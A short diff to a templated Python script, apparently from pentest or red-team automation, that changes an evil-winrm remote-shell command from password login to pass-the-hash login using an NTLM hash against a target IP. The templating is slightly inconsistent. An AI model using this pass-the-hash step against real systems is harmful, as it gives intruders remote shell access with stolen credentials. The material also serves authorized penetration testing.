@@ -7,9 +7,9 @@
 
       target_ip = "{{ target_ip }}"
       username = "{{ username }}"
-      password = "{{ password }}"
+      password = "{{ ntlm }}"
 
-      command = f"evil-winrm -i {target_ip} -u {username} -p {password}"
+      command = f"evil-winrm -i {target_ip} -u {username} -H {ntlm}"
 
       child = pexpect.spawn(command)
       child.timeout = None
